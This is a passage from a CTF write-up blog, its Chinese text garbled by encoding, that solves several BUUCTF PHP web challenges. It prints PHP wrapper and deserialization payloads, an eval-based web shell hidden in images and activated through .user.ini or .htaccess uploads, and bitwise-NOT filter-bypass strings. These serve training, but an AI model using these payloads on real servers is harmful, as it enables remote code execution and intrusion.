zjctf&quot;</span>))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&lt;h1&gt;&quot;</span>.<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$text</span>,<span class="string">&#x27;r&#x27;</span>).<span class="string">&quot;&lt;/h1&gt;&lt;/br&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag/&quot;</span>,<span class="variable">$file</span>))&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Not now!&quot;</span>;</span><br><span class="line">        <span class="keyword">exit</span>(); </span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">include</span>(<span class="variable">$file</span>);  <span class="comment">//useless.php</span></span><br><span class="line">        <span class="variable">$password</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$password</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$password</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure></div>

<p>ç¬¬ä¸€ä¸ª</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$text</span>)&amp;&amp;(<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$text</span>,<span class="string">&#x27;r&#x27;</span>)===<span class="string">&quot;welcome to the zjctf&quot;</span>)<span class="comment">//rä¸ºè¯»å–æƒé™</span></span><br></pre></td></tr></table></figure></div>

<p>file_get_contents()å‡½æ•°æ˜¯å°†æ–‡ä»¶å†…å®¹è¯»å–åˆ°å˜é‡ï¼Œè€Œè¿™é‡Œæ˜¯ä»å˜é‡è¯»å–ï¼Œè¯»å–textå˜é‡çš„å€¼ï¼Œè¿™é‡Œéœ€è¦textå˜é‡ä¸º<code>welcome to the zjctf</code></p>
<p>ä½†æ˜¯å› ä¸ºå¯èƒ½å­˜åœ¨å¯¹å˜é‡çš„æ­£åˆ™åŒ¹é…ï¼Œè¿‡æ»¤ï¼Œä¸€èˆ¬æ˜¯ç”¨base64ç»•è¿‡</p>
<p>è¿™é‡Œå°±å¯ä»¥åˆ©ç”¨ä¸¤ä¸ªä¼ªåè®®ï¼Œphp://inputå’Œdata://ï¼Œè¿™ä¸¤ä¸ªä¸€ä¸ªæ˜¯è¯»å–postæ•°æ®ï¼Œä¸€ä¸ªæ˜¯è¯»å–getæ•°æ®ï¼Œè¿™é‡Œç”¨data://åè®®</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="XL"><figure class="iseeu highlight /xl"><table><tr><td class="code"><pre><span class="line">?<span class="keyword">text</span>=<span class="keyword">data</span>:<span class="comment">//text/plain;base64,d2VsY29tZSB0byB0aGUgempjdGY=</span></span><br></pre></td></tr></table></figure></div>

<p>å½“ç„¶è¿™é‡Œä¸ç”¨base64ä¹Ÿå¯ä»¥</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="LIVECODESERVER"><figure class="iseeu highlight /livecodeserver"><table><tr><td class="code"><pre><span class="line">?<span class="keyword">text</span>=data://<span class="keyword">text</span>/plain;welcome <span class="built_in">to</span> <span class="keyword">the</span> zjctf</span><br></pre></td></tr></table></figure></div>

<p>ç¬¬äºŒä¸ª</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">include</span>(<span class="variable">$file</span>);  <span class="comment">//useless.php</span></span><br></pre></td></tr></table></figure></div>

<p>ä¸€ä¸ªæ–‡ä»¶åŒ…å«ï¼Œå°è¯•ç”¨php://filterè¯»å–<code>useless.php</code></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="AWK"><figure class="iseeu highlight /awk"><table><tr><td class="code"><pre><span class="line">&amp;file=php:<span class="regexp">//</span>filter<span class="regexp">/read=conver.base64-encode/</span>resource=useless.php</span><br></pre></td></tr></table></figure></div>

<p>è‡³äºpasswordï¼ŒçŒœæµ‹åº”è¯¥æ˜¯åœ¨useless.phpé‡Œæ‰æœ‰çº¿ç´¢ï¼Œå…ˆèµ‹å€¼1çœ‹çœ‹</p>
<p>äºæ˜¯å…ˆæ„é€ ä¸€ä¸ªpayload</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="AWK"><figure class="iseeu highlight /awk"><table><tr><td class="code"><pre><span class="line">?text=data:<span class="regexp">//</span>text<span class="regexp">/plain;base64,d2VsY29tZSB0byB0aGUgempjdGY=&amp;file=php:/</span><span class="regexp">/filter/</span>read=convert.base64-encode/resource=useless.php&amp;password=<span class="number">1</span></span><br></pre></td></tr></table></figure></div>

<p>å¾—åˆ°<code>useless.php</code>å†…å®¹</p>
<p><img src="/2022/06/21/buuctf-wp/image-20220823175723137.png" alt="image-20220823175723137"></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line">PD9waHAgIAoKY2xhc3MgRmxhZ3sgIC8vZmxhZy5waHAgIAogICAgcHVibGljICRmaWxlOyAgCiAgICBwdWJsaWMgZnVuY3Rpb24gX190b3N0cmluZygpeyAgCiAgICAgICAgaWYoaXNzZXQoJHRoaXMtPmZpbGUpKXsgIAogICAgICAgICAgICBlY2hvIGZpbGVfZ2V0X2NvbnRlbnRzKCR0aGlzLT5maWxlKTsgCiAgICAgICAgICAgIGVjaG8gIjxicj4iOwogICAgICAgIHJldHVybiAoIlUgUiBTTyBDTE9TRSAhLy8vQ09NRSBPTiBQTFoiKTsKICAgICAgICB9ICAKICAgIH0gIAp9ICAKPz4gIAo</span><br><span class="line"></span><br><span class="line">è§£ç å</span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Flag</span></span>&#123;  <span class="comment">//flag.php  </span></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$file</span>;  </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__tostring</span>(<span class="params"></span>)</span>&#123;  </span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable language_">$this</span>-&gt;file))&#123;  </span><br><span class="line">            <span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$this</span>-&gt;file); </span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">return</span> (<span class="string">&quot;U R SO CLOSE !///COME ON PLZ&quot;</span>);</span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br><span class="line"><span class="meta">?&gt;</span>  </span><br></pre></td></tr></table></figure></div>

<p>å†çœ‹çœ‹passwordå˜é‡</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$password</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$password</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$password</span>;</span><br></pre></td></tr></table></figure></div>
<p>è¿™é‡Œç”¨äº†ååºåˆ—åŒ–ï¼Œæ‰€ä»¥passwordå°±æ˜¯åºåˆ—åŒ–åçš„å€¼</p>
<p>åˆ©ç”¨<code>useless.php</code>æ„é€ åºåˆ—åŒ–</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Flag</span></span>&#123; </span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$file</span>=<span class="string">&quot;flag.php&quot;</span> ;  </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__tostring</span>(<span class="params"></span>)</span>&#123;  </span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable language_">$this</span>-&gt;file))&#123;  </span><br><span class="line">            <span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$this</span>-&gt;file); </span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">return</span> (<span class="string">&quot;U R SO CLOSE !///COME ON PLZ&quot;</span>);</span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br><span class="line"><span class="variable">$password</span> = <span class="keyword">new</span> <span class="title class_">Flag</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$password</span>);</span><br><span class="line"><span class="meta">?&gt;</span>  </span><br></pre></td></tr></table></figure></div>

<p>è¿è¡Œå        </p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="APACHE"><figure class="iseeu highlight /apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">O</span>:<span class="number">4</span>:<span class="string">&quot;Flag&quot;</span>:<span class="number">1</span>:&#123;s:<span class="number">4</span>:<span class="string">&quot;file&quot;</span>;s:<span class="number">8</span>:<span class="string">&quot;flag.php&quot;</span>;&#125;  </span><br></pre></td></tr></table></figure></div>

<p>æœ€åpayload</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PGSQL"><figure class="iseeu highlight /pgsql"><table><tr><td class="code"><pre><span class="line">?<span class="type">text</span>=data://<span class="type">text</span>/plain;base64,d2VsY29tZSB0byB0aGUgempjdGY=&amp;file=useless.php&amp;<span class="keyword">password</span>=O:<span class="number">4</span>:&quot;Flag&quot;:<span class="number">1</span>:&#123;s:<span class="number">4</span>:&quot;file&quot;;s:<span class="number">8</span>:&quot;flag.php&quot;;&#125;</span><br><span class="line"></span><br><span class="line">//ä»”ç»†ä¸€ä¸‹ä¼šæ³¨æ„åˆ°è¿™é‡Œçš„fileçš„å€¼ä¸­ï¼Œä¼ªåè®®åˆ é™¤äº†ï¼Œ</span><br><span class="line">è¿™æ˜¯å› ä¸ºå¼€å§‹é»˜è®¤éƒ½æ˜¯<span class="keyword">index</span>.phpï¼Œä½†æ˜¯<span class="keyword">index</span>.phpæ²¡æœ‰Flagç±»ï¼Œ</span><br><span class="line">å¦‚æœæƒ³æ‰§è¡Œååºåˆ—åŒ–ï¼Œé‚£å°±éœ€è¦åŒ…å«Flagç±»ï¼Œä¹Ÿå°±æ˜¯è¿™é‡Œçš„useless.phpé‡Œçš„</span><br><span class="line">æ‰€ä»¥è¿™é‡Œåˆ é™¤fileé‡Œçš„ä¼ªåè®®ï¼Œåªç•™useless.phpçš„æ–‡ä»¶å</span><br><span class="line">å°±æ˜¯åˆ©ç”¨  <span class="keyword">include</span>($file); </span><br><span class="line">æŠŠuseless.phpåŒ…å«åœ¨<span class="keyword">index</span>.phpé‡Œï¼Œä»è€Œå¯ä»¥æˆåŠŸæ‰§è¡Œååºåˆ—åŒ–ï¼Œå¾—åˆ°flag</span><br></pre></td></tr></table></figure></div>

<p>å¾—åˆ°flag</p>
<h2 id="9-SUCTF-2019-CheckIn"><a href="#9-SUCTF-2019-CheckIn" class="headerlink" title="9.[SUCTF 2019]CheckIn"></a>9.[SUCTF 2019]CheckIn</h2><h3 id="1-é¢˜ç›®æè¿°-6"><a href="#1-é¢˜ç›®æè¿°-6" class="headerlink" title="1)é¢˜ç›®æè¿°"></a>1)é¢˜ç›®æè¿°</h3><p>æ— </p>
<h3 id="2-wp-6"><a href="#2-wp-6" class="headerlink" title="2)wp"></a>2)wp</h3><p>å…ˆä¸Šä¼ ä¸€ä¸ªæ–‡æœ¬æ–‡ä»¶è¯•è¯•</p>
<p><img src="/2022/06/21/buuctf-wp/image-20220825173012665.png" alt="image-20220825173012665"></p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">exif_imagetypeæ˜¯åˆ¤æ–­ä¸€ä¸ªå›¾åƒçš„ç±»å‹çš„è¿›ç¨‹ã€‚</span><br></pre></td></tr></table></figure>

<p>æ‰€ä»¥åªèƒ½ä¸Šä¼ å›¾ç‰‡</p>
<p>å…ˆä¸Šä¼ ä¸€ä¸ªåŒ…å«PHPæœ¨é©¬çš„å›¾ç‰‡é©¬è¯•è¯•</p>
<p><img src="/2022/06/21/buuctf-wp/image-20220825174837632.png" alt="image-20220825174837632"></p>
<p>çœ‹æ¥æ˜¯è¿‡æ»¤äº†<code>&lt;?</code>ï¼Œæ‰€ä»¥é™¤äº†php,å…¶ä»–çš„asp,aspx,jsp,jséƒ½å¯ä»¥ç»•è¿‡</p>
<p>è¿™é‡Œä»¥jsä¸¾ä¾‹</p>
<p>åˆ›å»ºä¸€ä¸ªjsæ–‡ä»¶ï¼Œå†…å®¹ä¸º</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="JS"><figure class="iseeu highlight /js"><table><tr><td class="code"><pre><span class="line">&lt;script language=<span class="string">&quot;php&quot;</span>&gt;@<span class="built_in">eval</span>($_POST[<span class="string">&quot;cmd&quot;</span>]);&lt;/script&gt;</span><br></pre></td></tr></table></figure></div>

<p>åœ¨å’Œä¸€ä¸ªæ™®é€šå›¾ç‰‡åˆæˆï¼Œä¹Ÿå¯ä»¥åŠ ä¸ªæ–‡ä»¶å¤´GIF89a</p>
<p>å›¾ç‰‡é©¬åä¸º<code>haha.gif</code></p>
<p>ç„¶åä¸Šä¼ </p>
<p><img src="/2022/06/21/buuctf-wp/image-20220825210858681.png" alt="image-20220825210858681"></p>
<p>ç”±äºä¸æ˜¯phpæœ¨é©¬ï¼Œæ‰€ä»¥æ— æ³•ç”¨<code>.htaccess</code>æ–‡ä»¶ç»•è¿‡</p>
<p>è¿™é‡Œå°±éœ€è¦ç”¨<code>.user.ini</code>é…ç½®æ–‡ä»¶,å½“ç„¶ä½¿ç”¨å‰ææ˜¯<code>.user.ini</code>æ–‡ä»¶ä¸‹æœ‰phpæ–‡ä»¶ï¼Œä¸ç„¶ä¹Ÿä¸èƒ½åŒ…å«äº†</p>
<p>æ¨èçœ‹ä¸€ä¸‹è¿™ç¯‡<a href="https://wooyun.js.org/drops/user.ini%E6%96%87%E4%BB%B6%E6%9E%84%E6%88%90%E7%9A%84PHP%E5%90%8E%E9%97%A8.html">æ–‡ç« </a></p>
<p><strong>åœ¨æœåŠ¡å™¨ä¸­ï¼Œåªè¦æ˜¯è¿ç”¨äº†fastcgiçš„æœåŠ¡å™¨å°±èƒ½å¤Ÿåˆ©ç”¨è¯¥æ–¹å¼getshellï¼Œä¸è®ºæ˜¯apacheæˆ–è€…ngnixæˆ–æ˜¯å…¶ä»–æœåŠ¡å™¨ã€‚</strong></p>
<p> <strong>è¿™ä¸ªæ–‡ä»¶æ˜¯php.iniçš„è¡¥å……æ–‡ä»¶ï¼Œå½“ç½‘é¡µè®¿é—®çš„æ—¶å€™å°±ä¼šè‡ªåŠ¨æŸ¥çœ‹å½“å‰ç›®å½•ä¸‹æ˜¯å¦æœ‰.user.iniï¼Œç„¶åå°†å…¶è¡¥å……è¿›php.iniï¼Œå¹¶ä½œä¸ºcgiçš„å¯åŠ¨é¡¹ã€‚</strong></p>
<p> <strong>å…¶ä¸­å¾ˆå¤šåŠŸèƒ½è®¾ç½®äº†åªèƒ½php.inié…ç½®ï¼Œä½†æ˜¯è¿˜æ˜¯æœ‰ä¸€äº›å±é™©çš„åŠŸèƒ½å¯ä»¥è¢«æˆ‘ä»¬æ§åˆ¶ï¼Œæ¯”å¦‚auto_prepend_fileã€‚</strong></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ANGELSCRIPT"><figure class="iseeu highlight /angelscript"><table><tr><td class="code"><pre><span class="line"><span class="built_in">auto</span>_append_fileã€<span class="built_in">auto</span>_prepend_file:æŒ‡å®šä¸€ä¸ªæ–‡ä»¶ï¼Œè‡ªåŠ¨åŒ…å«åœ¨è¦æ‰§è¡Œçš„æ–‡ä»¶å‰ï¼Œç±»ä¼¼äºåœ¨æ–‡ä»¶å‰è°ƒç”¨äº†require()å‡½æ•°ã€‚è€Œ<span class="built_in">auto</span>_append_fileç±»ä¼¼ï¼Œåªæ˜¯åœ¨æ–‡ä»¶åé¢åŒ…å«ã€‚ </span><br><span class="line"></span><br><span class="line">ä½¿ç”¨æ–¹æ³•å¾ˆç®€å•ï¼Œç›´æ¥å†™åœ¨.user.iniä¸­ï¼š</span><br></pre></td></tr></table></figure></div>

<p>æ‰€ä»¥è¿™é‡Œè®¾ç½®è‡ªåŠ¨åŒ…å«çš„æ–‡ä»¶ä¸º<code>haha.gif</code></p>
<p>äºæ˜¯<code>.user.ini</code>å†…å®¹ä¸º</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ANGELSCRIPT"><figure class="iseeu highlight /angelscript"><table><tr><td class="code"><pre><span class="line">GIF89a       <span class="comment">//ç»•è¿‡å›¾ç‰‡åˆ¤æ–­         </span></span><br><span class="line"><span class="built_in">auto</span>_prepend_file=haha.gif</span><br></pre></td></tr></table></figure></div>

<p>ä¸Šä¼ <code>.user.ini</code></p>
<p><img src="/2022/06/21/buuctf-wp/image-20220825214029074.png" alt="image-20220825214029074"></p>
<p>è¿™ä¸ªæ—¶å€™haha.gifå°±å·²ç»åŒ…å«åœ¨index.phpï¼Œå¯ä»¥è®¿é—®</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="APACHE"><figure class="iseeu highlight /apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">http</span>://<span class="number">9</span>c7a4b64-<span class="number">1</span>c49-<span class="number">4</span>ee4-a146-dc6763b5ce1c.node4.buuoj.cn:<span class="number">81</span>/uploads/c47b21fcf8f0bc8b3920541abd8024fd/index.php</span><br></pre></td></tr></table></figure></div>

<p>èƒ½çœ‹åˆ°<code>GIF98a?</code></p>
<p>ç„¶åä¹Ÿå¯ä»¥ç”¨hackbarï¼Œpostä¸Šä¼ å‘½ä»¤ï¼Œå¦‚å›¾ä¸­çš„phpinfo()</p>
<p><img src="/2022/06/21/buuctf-wp/image-20220825215617387.png" alt="image-20220825215617387"></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ABNF"><figure class="iseeu highlight /abnf"><table><tr><td class="code"><pre><span class="line"><span class="attribute">cmd</span><span class="operator">=</span>var_dump(scandir(<span class="string">&quot;/&quot;</span>))<span class="comment">;//çœ‹çœ‹æ ¹ç›®å½•ï¼Œæ‰¾åˆ°flag</span></span><br></pre></td></tr></table></figure></div>

<p><img src="/2022/06/21/buuctf-wp/image-20220825220933577.png" alt="image-20220825220933577"></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ABNF"><figure class="iseeu highlight /abnf"><table><tr><td class="code"><pre><span class="line"><span class="attribute">cmd</span><span class="operator">=</span>var_dump(file_get_contents(<span class="string">&quot;/flag&quot;</span>))<span class="comment">;//è¯»å–flagæ–‡ä»¶</span></span><br></pre></td></tr></table></figure></div>

<p><img src="/2022/06/21/buuctf-wp/image-20220825221229971.png" alt="image-20220825221229971"></p>
<hr>
<p>å½“ç„¶ç”¨èšå‰‘æœ€ç®€å•ï¼Œè¿æ¥ä¹ŸæˆåŠŸ</p>
<p><img src="/2022/06/21/buuctf-wp/image-20220825214728996.png" alt="image-20220825214728996"></p>
<p>å¯ä»¥çœ‹åˆ°<strong>index.phpæ–‡ä»¶ä¹Ÿåœ¨ä¸Šä¼ çš„ç›®å½•</strong>ä¸‹ï¼Œä¹Ÿå°±æ˜¯<code>.user.ini</code>çš„åŒä¸€ä¸ªç›®å½•ä¸‹ï¼Œæ‰€ä»¥æ‰å¯ä»¥æˆåŠŸåŒ…å«</p>
<p><img src="/2022/06/21/buuctf-wp/image-20220825215454619.png" alt="image-20220825215454619"></p>
<p>åœ¨æ ¹ç›®å½•å‘ç°äº†flagï¼Œæ‰“å¼€å³å¯å¾—åˆ°flag</p>
<hr>
<p>ä½†æˆ‘å‘ç°æ ¹ç›®å½•ä¸€ä¸ªclean.shæ–‡ä»¶ï¼Œè¿™æ˜¯ä¸€ä¸ªå®šæ—¶æ¸…ç©ºlinuxæœåŠ¡å™¨ä¸Šç¼“å­˜çš„æ–‡ä»¶è„šæœ¬ï¼Œä¸Šä¼ çš„æ–‡ä»¶ä¼šè¢«å®šæ—¶åˆ é™¤</p>
<p><img src="/2022/06/21/buuctf-wp/image-20220825215047906.png" alt="image-20220825215047906"></p>
<p>è¿™æ˜¯ä¸€åˆ†é’Ÿå·¦å³åï¼Œé¶åœºç¯å¢ƒè¿˜åœ¨ä½†æ˜¯æ— æ³•è®¿é—®äº†ï¼Œæ‰€ä»¥è¦å¿«ç‚¹æ‹¿å–flag</p>
<p><img src="/2022/06/21/buuctf-wp/image-20220825215220524.png" alt="image-20220825215220524"></p>
<p>è¿™é‡Œæœ¬æ¥æƒ³åˆ æ‰clean.shï¼Œå‘ç°æ²¡æƒé™ï¼Œæ— æ³•æ‰§è¡Œï¼Œsudoä¹Ÿä¸è¡Œï¼Œé‚£å°±åªèƒ½é€Ÿæˆ˜é€Ÿå†³äº†</p>
<p><img src="/2022/06/21/buuctf-wp/image-20220825220024393.png" alt="image-20220825220024393"></p>
<p>æ ¹ç›®å½•å¾—åˆ°flag</p>
<h2 id="10-GXYCTF2019-BabyUpload"><a href="#10-GXYCTF2019-BabyUpload" class="headerlink" title="10.[GXYCTF2019]BabyUpload"></a>10.[GXYCTF2019]BabyUpload</h2><h3 id="1-é¢˜ç›®æè¿°-7"><a href="#1-é¢˜ç›®æè¿°-7" class="headerlink" title="1)é¢˜ç›®æè¿°"></a>1)é¢˜ç›®æè¿°</h3><p>æ— </p>
<h3 id="2-wp-7"><a href="#2-wp-7" class="headerlink" title="2)wp"></a>2)wp</h3><p>è¿™é“é¢˜ä¸éš¾ï¼Œä½†æ˜¯å¼€å§‹ä¸æ¸…æ¥šè¿˜æ˜¯ä¸çŸ¥é“è¿‡æ»¤äº†ä»€ä¹ˆï¼Œ</p>
<p>è¿™é“é¢˜ä»‹ç»å‡ ä¸ªç‚¹å°±å¯ä»¥äº†</p>
<p>ç¬¬ä¸€ä¸ªæ˜¯è¿‡æ»¤äº†åç¼€åå«ph</p>
<p>ç¬¬äºŒä¹Ÿæ˜¯å…³é”®çš„ï¼Œå®ƒåªå…è®¸ä¸Šä¼ <code>content-type: image/jpeg</code>ï¼Œpngå’Œgiféƒ½ä¸å¯ä»¥</p>
<p>ç¬¬ä¸‰ç‚¹å°±æ˜¯å®ƒè¿‡æ»¤äº†æ–‡ä»¶å†…å®¹é‡Œå«<code>&lt;?</code></p>
<p>æ‰€ä»¥ä¸Šä¼ ä¸€ä¸ªjpegæ–‡ä»¶ï¼ŒæŠ“åŒ…ä¿®æ”¹å†…å®¹ä¸ºéphpä½†åŒ…å«phpçš„ä¸€ä¸ªè„šæœ¬ï¼Œ</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="JSP"><figure class="iseeu highlight /jsp"><table><tr><td class="code"><pre><span class="line">&lt;script language=<span class="string">&quot;php&quot;</span>&gt;<span class="meta">@eval($_POST[&quot;cmd&quot;])</span>;&lt;/script&gt;</span><br></pre></td></tr></table></figure></div>

<p>å†ä¸Šä¼ .htaccessæ–‡ä»¶ï¼Œè§£ææ‰€æœ‰æ–‡ä»¶ä¸ºphp</p>
<p>ç”¨èšå‰‘è¿æ¥jpegæ–‡ä»¶ï¼Œå³å¯</p>
<h2 id="11-æå®¢å¤§æŒ‘æˆ˜-2019-RCE-ME"><a href="#11-æå®¢å¤§æŒ‘æˆ˜-2019-RCE-ME" class="headerlink" title="11.[æå®¢å¤§æŒ‘æˆ˜ 2019]RCE ME"></a>11.[æå®¢å¤§æŒ‘æˆ˜ 2019]RCE ME</h2><h3 id="1-é¢˜ç›®æè¿°-8"><a href="#1-é¢˜ç›®æè¿°-8" class="headerlink" title="1)é¢˜ç›®æè¿°"></a>1)é¢˜ç›®æè¿°</h3><p>æ— </p>
<h3 id="2-wp-8"><a href="#2-wp-8" class="headerlink" title="2)wp"></a>2)wp</h3><p>å…ˆå¯¹ä»£ç åˆ†æ</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>]))&#123;</span><br><span class="line">            <span class="variable">$code</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>];</span><br><span class="line">                    <span class="keyword">if</span>(<span class="title function_ invoke__">strlen</span>(<span class="variable">$code</span>)&gt;<span class="number">40</span>)&#123;</span><br><span class="line">                                        <span class="keyword">die</span>(<span class="string">&quot;This is too Long.&quot;</span>);</span><br><span class="line">                                                &#125;</span><br><span class="line">                    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/[A-Za-z0-9]+/&quot;</span>,<span class="variable">$code</span>))&#123;</span><br><span class="line">                                        <span class="keyword">die</span>(<span class="string">&quot;NO.&quot;</span>);</span><br><span class="line">                                                &#125;</span><br><span class="line">                    @<span class="keyword">eval</span>(<span class="variable">$code</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// ?&gt;</span></span><br></pre></td></tr></table></figure></div>

<p>å¯ä»¥çœ‹åˆ°codeè¢«æ­£åˆ™åŒ¹é…ï¼Œæ‰€ä»¥å­—æ¯å¤§å°å†™å’Œæ•°å­—éƒ½ä¸èƒ½è¾“å…¥</p>
<p>è¿™é‡Œå°±å­¦åˆ°æ–°ä¸œè¥¿äº†</p>
<p><strong>å–åç»•è¿‡</strong></p>
<p><u><strong>å–å</strong>å°±æ˜¯å°†æ•°å­—è½¬åŒ–ä¸ºäºŒè¿›åˆ¶,å†æŠŠäºŒè¿›åˆ¶ä¸­çš„1å˜æˆ0,0å˜æˆ1</u></p>
<p><code>~</code>æ˜¯å–åç¬¦å·ï¼Œ</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="MEL"><figure class="iseeu highlight /mel"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">echo urlencode(~<span class="string">&#x27;assert&#x27;</span>);</span><br><span class="line">echo urlencode(~<span class="string">&#x27;eval($_REQUEST[8])&#x27;</span>);</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">ç»“æœï¼š</span><br><span class="line">%9E%8C%8C%9A%8D%8B</span><br><span class="line">%9A%89%9E%93%D7%DB%A0%AD%BA%AE%AA%BA%AC%AB%A4%C7%A2%D6</span><br><span class="line"></span><br><span class="line"><span class="comment">//phpæ–­è¨€ï¼šassert â€” æ£€æŸ¥ä¸€ä¸ªæ–­è¨€æ˜¯å¦ä¸º falseï¼Œå¦‚æœå‚æ•°æ˜¯å­—ç¬¦ä¸²ï¼Œå®ƒå°†ä¼šè¢« assert() å½“åš PHP ä»£ç æ¥æ‰§è¡Œ</span></span><br></pre></td></tr></table></figure></div>

<p>ç„¶åå†èµ‹å€¼</p>
